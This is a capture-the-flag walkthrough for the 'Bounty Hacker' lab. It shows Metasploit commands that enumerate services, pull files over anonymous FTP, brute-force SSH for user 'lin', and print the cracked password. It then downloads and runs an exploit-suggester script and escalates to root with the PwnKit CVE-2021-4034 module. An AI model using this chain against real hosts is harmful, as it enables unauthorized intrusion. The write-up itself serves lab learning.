---
cover: ../../.gitbook/assets/e27.jpeg
coverY: 0
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Bounty Hacker

### Enumeration

For this lab, I'm gonna use MSFconsole.

```bash
msf6> workspace -a bounty-hacker
msf6> setg rhosts 10.10.111.7
msf6> db_nmap -p- -T4 10.10.111.7
msf6> db_nmap -p 21,22,80 -sV -O 10.10.111.7
```

There are 3 services : `HTTP` `FTP` `SSH`

```bash
msf6> use auxiliary/scanner/ftp/anonymous
msf6> run
```

You have anonymous access to the FTP service

```bash
kali@attack> ftp -a 10.10.111.7
ftp> passive
ftp> get locks.txt
ftp> get task.txt
ftp> bye
```

### Exploitation

The file `locks.txt` seems to be a wordlist and the `task.txt` mentions a user named **lin**. We can try to brute-force SSH authentication with this wordlist.

```bash
msf6> use auxialiary/scanner/ssh/ssh_login
msf6> set username lin
msf6> set pass_file locks.txt
msf6> set stop_on_success true
msf6> set verbose true
msf6> run
```

After few enumeration, the modules highlights the credentials `lin:RedDr4gonSynd1cat3` and it opens a new shell session. Try to upgrade it to meterpreter.

```bash
msf6> sessions -u 1
```

### Post-exploitation

Great ! We get a meterpreter sessions as **lin**. We can proceed to the post-exploitation phase. I will use [Linux Exploit Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester) for this step.

```bash
msf6> wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
msf6> sessions 2
meterpreter> cd /tmp
meterpreter> upload les.sh
meterpreter> chmod 777 les.sh
meterpreter> shell

/bin/bash -i
lin@target> cd /tmp
lin@target> ./les.sh
```

The first suggestion is the [PwnKit](https://github.com/ly4k/PwnKit) (CVE-2021-4034) exploit.

```bash
msf6> search cve-2021-4034
msf6> use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
msf6> set session 2
msf6> set lhost 10.8.15.147
msf6> run
```

And it opens a **root** meterpreter session, you get the `root.txt` flag !
